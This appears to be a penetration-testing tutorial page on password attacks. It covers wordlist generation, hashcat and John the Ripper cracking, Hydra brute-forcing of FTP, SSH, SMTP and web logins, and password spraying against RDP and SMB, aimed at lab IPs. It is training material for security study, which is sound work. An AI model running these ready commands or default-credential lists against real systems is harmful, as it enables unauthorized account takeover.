<div align="center">

| Previous Phase | Next Phase |
|:-------------------------------------------:|:---------------------------------------------:|
| [Exploitation](4.0-Exploitation.md) | [Post-Exploitattion](../5-Post-exploitation/5.0-Post-Exploitation.md) |

</div>

<br>
<br>
<br>

# Password Attacks

In this section, we will discuss the techniques that can be used to perform password attacks. The following techniques are going to be covered in this section: 
- Dictionary
- Brute-force
- Guessing Attacks

> These techniques are considered active "online" attacks where the attacker needs to communicate with the target machine to obtain the password in order to gain unauthorized access to the machine.

## Password Cracking vs. Password Guessing

* **Password cracking** is a technique for discovering passwords from encrypted or hashed data. Attackers obtain hashed passwords from compromised systems or by capturing network traffic, then use tools like **Hashcat** and **John the Ripper** to crack them locally.

* **Password guessing** targets online protocols and services using dictionary-based attempts, sending requests directly to the target system.

<br>

<p align="center">

| Aspect | Password Cracking | Password Guessing |
|--------|------------------|-------------------|
| **Location** | Performed locally or on attacker-controlled systems | Targets online protocols/services |
| **Detection** | Difficult to detect (offline) | Easily detected via failed login logs |
| **Speed** | Limited only by hardware resources | Time-consuming (network latency) |
| **Lockout Risk** | None | May trigger account lockouts |
| **Goal** | Escalate privileges, gain system/network access | Gain unauthorized access to services |

</p>

<br>

---

<br>

## Password Profiling

Having a good wordlist is critical to carrying out a successful password attack. It is important to know how you can generate username lists and password lists. So in this section, we will discuss creating targeted username and password lists. We will also cover various topics, including default, weak, leaked passwords, and creating targeted wordlists.

### Default Passwords

Before performing password attacks, it is worth trying default passwords against the targeted service. Manufacturers set default passwords with products and equipment such as switches, firewalls, and routers. In scenarios where customers don't change the default password, the system becomes vulnerable.

**Common default credentials to try:**
- `admin:admin`
- `admin:123456`
- `admin:password`
- `tomcat:admin` (for Apache Tomcat servers)

**Default password databases:**
- https://cirt.net/passwords
- https://default-password.info/
- https://datarecovery.com/rd/default-passwords/

### Weak Passwords

Professionals collect and generate weak password lists over time, often combining them into large wordlists. These lists are generated based on pentesting experience and may contain publicly leaked passwords.

**Common weak password lists:**
- https://www.skullsecurity.org/wiki/Passwords - Well-known password collections
- [SecLists](https://github.com/danielmiessler/SecLists) - Huge collection of all kinds of lists

###  Leaked Passwords

Sensitive data such as passwords or hashes may be publicly disclosed or sold as a result of a breach (often called "dumps"). Depending on the contents, an attacker may need to extract passwords or crack hashes.

**Common leaked password lists:**
- `SecLists/Passwords/Leaked-Databases` - Contains webhost, elitehacker, hak5, Hotmail, PhpBB leaks

### Combined Wordlists

Combine multiple wordlists into one large file:

```bash
cat file1.txt file2.txt file3.txt > combined_list.txt
```

Remove duplicates from the combined list:

```bash
sort combined_list.txt | uniq -u > cleaned_combined_list.txt
```

### Customized Wordlists

Creating custom password lists from target websites increases the chances of finding valid credentials. Company websites often contain valuable information including employee names, emails, and business-specific keywords.

#### Using Cewl

**Cewl** is a powerful tool to crawl websites and extract strings/keywords for wordlist generation.

```bash
cewl -w list.txt -d 5 -m 5 http://target.com
```

<p align="center">

| Option | Description |
|--------|-------------|
| `-w list.txt` | Write output to file |
| `-m 5` | Minimum word length (5 characters) |
| `-d 5` | Crawling depth level (default: 2) |

</p>

### Username Wordlists

Gathering employee names during enumeration is essential. From a name like **John Smith**, various username formats can be generated:

<p align="center">

| Format | Example |
|--------|---------|
| `{first name}` | john |
| `{last name}` | smith |
| `{first name}{last name}` | johnsmith |
| `{last name}{first name}` | smithjohn |
| `{first initial}{last name}` | jsmith |
| `{first initial}.{last name}` | j.smith |
| `{first initial}-{last name}` | j-smith |

</p>

#### Using username_generator

```bash
# Clone the tool
git clone https://github.com/therodri2/username_generator.git
cd username_generator

# View help
python3 username_generator.py -h

# Generate usernames from a name list
echo "John Smith" > users.lst
python3 username_generator.py -w users.lst
```

**Options:**

<p align="center">

| Option | Description |
|--------|-------------|
| `-w wordlist` | Specify path to the wordlist |
| `-u` | Also produce uppercase permutations |

</p>

### Keyspace Technique

The keyspace technique involves specifying a range of characters, numbers, and symbols to generate all possible combinations for a wordlist.

### Crunch

**Crunch** is a powerful tool for creating offline wordlists with specified character sets and patterns.

```bash
crunch <min> <max> <charset> [options]
```

**Basic example** - Generate all 2-character combinations using `0-4` and `a-d`:

```bash
crunch 2 2 01234abcd -o crunch.txt
```

**Output snippet:**
```
00, 01, 02, 03, 04, 0a, 0b, 0c, 0d, 10, ... , da, db, dc, dd
```

> **Warning:** Crunch can generate very large files. For example:  
> `crunch 8 8 0123456789abcdefABCDEF -o crunch.txt` creates a **459 GB** file with 54,875,873,536 words.

#### Pattern-Based Generation

Use the `-t` option with placeholders to create patterns:

<p align="center">

| Placeholder | Character Set |
|-------------|---------------|
| `@` | Lowercase alpha (a-z) |
| `,` | Uppercase alpha (A-Z) |
| `%` | Numeric (0-9) |
| `^` | Special characters (including space) |

</p>

**Example** - Generate passwords starting with "pass" followed by 2 numbers:

```bash
crunch 6 6 -t pass%%
# Output: pass00, pass01, pass02, ... pass99
```

### CUPP - Common User Passwords Profiler

**CUPP** is an interactive Python tool for creating custom wordlists based on target information (birthdate, pet name, company name, etc.). It supports **1337/leet mode** which substitutes letters with numbers (e.g., `a‚Üí4`, `i‚Üí1`, `e‚Üí3`).

#### Installation

```bash
git clone https://github.com/Mebus/cupp.git
cd cupp
python3 cupp.py -h
```

#### Options

<p align="center">

| Option | Description |
|--------|-------------|
| `-i` | Interactive mode - asks questions about target |
| `-w FILENAME` | Improve existing dictionary |
| `-l` | Download wordlists from repository |
| `-a` | Parse default credentials from Alecto DB |
| `-q` | Quiet mode (no banner) |

</p>

#### Interactive Mode

```bash
python3 cupp.py -i
```

CUPP will prompt for target information:
- First name, surname, nickname, birthdate
- Partner's/Child's/Pet's name
- Company name
- Special characters and leet mode options

#### Download Wordlists

```bash
python3 cupp.py -l
```

Available wordlists include: Moby, various languages (french, german, spanish, etc.), databases, names, literature, music, and more.

#### Alecto Database

Extract default usernames and passwords from Alecto DB:

```bash
python3 cupp.py -a
# Creates: alectodb-usernames.txt and alectodb-passwords.txt
```

<br>
<br>

# Offline Attacks

This section discusses **offline attacks**, including **dictionary**, **brute-force**, and **rule-based** attacks. 

<br>

## Dictionary Attacks

A **dictionary attack** guesses passwords using pre-gathered wordlists containing well-known words or phrases. Success depends on choosing or creating the best candidate wordlist for your target.

### Workflow

1. **Identify the hash type** using tools like `hashid` or `hash-identifier`
2. **Select a wordlist** (e.g., rockyou.txt)
3. **Run the attack** with appropriate hash mode

### Cracking with Hashcat

**Example:** Crack MD5 hash `f806fc5a2a0d5ba2471600758452799c`

```bash
hashcat -a 0 -m 0 f806fc5a2a0d5ba2471600758452799c /usr/share/wordlists/rockyou.txt
```

<p align="center">

| Option | Description |
|--------|-------------|
| `-a 0` | Dictionary attack mode |
| `-m 0` | MD5 hash mode (run `hashcat -h` for other types) |
| `<hash>` | Single hash or file containing hashes |
| `<wordlist>` | Path to wordlist file |

</p>

**Show cracked hash:**

```bash
hashcat -a 0 -m 0 f806fc5a2a0d5ba2471600758452799c /usr/share/wordlists/rockyou.txt --show
# Output: f806fc5a2a0d5ba2471600758452799c:rockyou
```

<br>

## Brute-Force Attacks

A **brute-force attack** tries all possible combinations of characters, unlike dictionary attacks which use predefined wordlists. Useful when password structure is known (e.g., 4-digit PIN: 0000-9999).

### Hashcat Charsets

<p align="center">

| Charset | Characters |
|---------|------------|
| `?l` | abcdefghijklmnopqrstuvwxyz |
| `?u` | ABCDEFGHIJKLMNOPQRSTUVWXYZ |
| `?d` | 0123456789 |
| `?h` | 0123456789abcdef |
| `?H` | 0123456789ABCDEF |
| `?s` | Special characters (space, !"#$%&'()*+, etc.) |
| `?a` | ?l?u?d?s (all of the above) |
| `?b` | 0x00 - 0xff |

</p>

### Generate Combinations

```bash
# Generate all 4-digit combinations (0000-9999)
hashcat -a 3 ?d?d?d?d --stdout
```

### Crack a 4-Digit PIN Hash

**Example:** Crack MD5 hash of a 4-digit PIN

```bash
hashcat -a 3 -m 0 05A5CF06982BA7892ED2A6D38FE832D6 ?d?d?d?d
# Result: 05a5cf06982ba7892ed2a6d38fe832d6:2021
```

<p align="center">

| Option | Description |
|--------|-------------|
| `-a 3` | Brute-force attack mode |
| `-m 0` | MD5 hash mode |
| `?d?d?d?d` | Mask for 4 digits (0000-9999) |

</p>

<br>

## Rule-Based Attacks

**Rule-based attacks** (also known as **hybrid attacks**) assume the attacker knows something about the password policy. Rules manipulate or "mangle" passwords to generate valid candidates within policy guidelines.

**Example mangling of "password":**
- `p@ssword`
- `Pa$$word`
- `Passw0rd`

### John the Ripper Rules

John the Ripper has built-in rule sets located at `/etc/john/john.conf` or `/opt/john/john.conf`.

**List available rules:**

```bash
cat /etc/john/john.conf | grep "List.Rules:" | cut -d"." -f3 | cut -d":" -f2 | cut -d"]" -f1 | awk NF
```

**Common rule sets:** `best64`, `KoreLogic`, `Jumbo`, `rockyou-30000`, `d3ad0ne`, `dive`

### Using Rules with John

**Expand a wordlist using the `best64` rule:**

```bash
john --wordlist=/tmp/single-password-list.txt --rules=best64 --stdout | wc -l
# Expands 1 password to 76 variations
```

<p align="center">

| Option | Description |
|--------|-------------|
| `--wordlist=` | Specify the wordlist/dictionary file |
| `--rules=` | Specify which rule set to use |
| `--stdout` | Print output to terminal |

</p>

**Using KoreLogic rules** (generates complex password lists):

```bash
john --wordlist=single-password-list.txt --rules=KoreLogic --stdout | grep "Tryh@ckm3"
# Finds complex variations like Tryh@ckm3 from "tryhackme"
```

### Creating Custom Rules

Add custom rules to the end of `/etc/john/john.conf`.

**Example:** Add symbols at the beginning and numbers at the end ‚Üí `[symbols]word[0-9]`

```bash
sudo vi /etc/john/john.conf
```

Add the following:

```
[List.Rules:THM-Password-Attacks]
Az"[0-9]" ^[!@#$]
```

<p align="center">

| Syntax | Description |
|--------|-------------|
| `[List.Rules:NAME]` | Define rule name |
| `Az` | Represents a single word from the wordlist |
| `"[0-9]"` | Append digit (0-9) to end of word |
| `^[!@#$]` | Add special character at beginning (`^` = start, `$` = end) |

</p>

**Apply custom rule:**

```bash
echo "password" > /tmp/single.lst
john --wordlist=/tmp/single.lst --rules=THM-Password-Attacks --stdout
```

**Output:**
```
!password0
@password0
#password0
$password0
...
```

<br>
<br>

# Online Password Attacks

**Online password attacks** involve guessing passwords for networked services that use username/password authentication, including HTTP, SSH, VNC, FTP, SNMP, POP3, and more.

> ‚ö†Ô∏è **Note:** Always try default credentials first before brute-forcing!

## Hydra

**Hydra** is a powerful tool for attacking logins across various network services. Each service has its own options and syntax.

### FTP

```bash
hydra -l ftp -P passlist.txt ftp://10.10.x.x
```

<p align="center">

| Option | Description |
|--------|-------------|
| `-l ftp` | Single username (use `-L` for wordlist) |
| `-P passlist.txt` | Password wordlist (use `-p` for single password) |
| `ftp://10.10.x.x` | Protocol and target IP/FQDN |

</p>

### SMTP

```bash
hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v
```

> Default SMTP port: 25

### SSH

```bash
hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v
```

> ‚ö†Ô∏è Many SSH configurations limit parallel tasks. Use `-t 4` to reduce tasks.

### HTTP Login Pages

For HTTP forms, you need to specify the request type (GET or POST) and analyze the request parameters.

**Syntax:**
```
<url>:<form parameters>:<condition string>[:<optional>]
```

**Example (GET form):**

```bash
hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f
```

**Example (POST form):**

```bash
hydra -l admin -P wordlist.txt 10.10.x.x http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid" -f
```

<p align="center">

| Component | Description |
|-----------|-------------|
| `http-get-form` / `http-post-form` | HTTP request type |
| `/login-get/index.php` | Path to login page |
| `username=^USER^&password=^PASS^` | Form parameters (`^USER^` and `^PASS^` are placeholders) |
| `F=Invalid` | Failure condition (text indicating failed login) |
| `S=logout.php` | Success condition (text indicating successful login) |
| `-f` | Stop after finding valid credentials |

</p>

> üí° **Tip:** Use browser dev tools or Burp Suite to analyze the HTTP request and identify form parameters and success/failure conditions.

### Hydra Quick Reference

<p align="center">

| Option | Description |
|--------|-------------|
| `-l` | Single username |
| `-L` | Username wordlist |
| `-p` | Single password |
| `-P` | Password wordlist |
| `-t` | Number of parallel tasks |
| `-v` | Verbose output |
| `-f` | Stop on first valid credential |
| `-s` | Specify non-default port |

</p>

## Other Online Attack Tools

- **Medusa** - Speedy, parallel, modular login brute-forcer
- **Ncrack** - High-speed network authentication cracker
- **Patator** - Multi-purpose brute-forcer with modular design


<br>
<br>


# Password Spraying Attacks

**Password spraying** targets many usernames using one common weak password, helping to avoid account lockout policies. Unlike brute-force attacks (many passwords against one user), spraying uses one password against many users.


<p align="center">
    <img src="../images/Exploitation/Password_Spraying.png" width=70%>
</p>

## Common Password Patterns

<p align="center">

| Pattern | Examples |
|---------|----------|
| Season + Year | `Fall2020`, `Spring2021`, `Winter2022` |
| Month + Year | `November2020`, `March2021`, `January2022` |
| Company + Numbers | `TryHackMe01`, `CompanyName123` |
| With Symbols (policy compliance) | `October2021!`, `Spring2021@`, `Fall2020#` |

</p>

> üí° **Tip:** Enumerate the target first to create a valid username/email list before spraying.

---

## SSH

```bash
hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10
```

<p align="center">

| Option | Description |
|--------|-------------|
| `-L` | Load list of usernames |
| `-p` | Single password to spray |

</p>

---

## RDP

Use **RDPassSpray** for RDP password spraying.

**Installation:**
```bash
git clone https://github.com/xFreed0m/RDPassSpray.git
cd RDPassSpray
pip3 install -r requirements.txt
```

**Single user attack:**
```bash
python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026
```

**Multiple users with domain:**
```bash
python3 RDPassSpray.py -U usernames-list.txt -p Spring2021! -d THM-labs -T RDP_servers.txt
```

<p align="center">

| Option | Description |
|--------|-------------|
| `-u` / `-U` | Single user / User list |
| `-p` / `-P` | Single password / Password list |
| `-t` / `-T` | Single target / Target list |
| `-d` | Domain name (Active Directory) |
| `-s` | Sleep between attempts (seconds) |
| `-r` | Random sleep (min max) |
| `-o` | Output results to CSV |

</p>

---

## Outlook Web Access (OWA)

**Tools:**
- **SprayingToolkit** (`atomizer.py`) - https://github.com/byt3bl33d3r/SprayingToolkit
- **MailSniper** - https://github.com/dafthack/MailSniper

---

## SMB

**Tool:** Metasploit

```bash
msfconsole
use auxiliary/scanner/smb/smb_login
set RHOSTS 10.10.x.x
set USER_FILE usernames.txt
set PASS_FILE passwords.txt
run
```

<br>

---

<br>
<br>

<div align="center">

| Previous Page | Next Page |
|:-------------------------------------------:|:---------------------------------------------:|
| [Exploitation](4.0-Exploitation.md) | [Post-Exploitation](../5-Post-exploitation/5.0-Post-Exploitation.md) |

</div>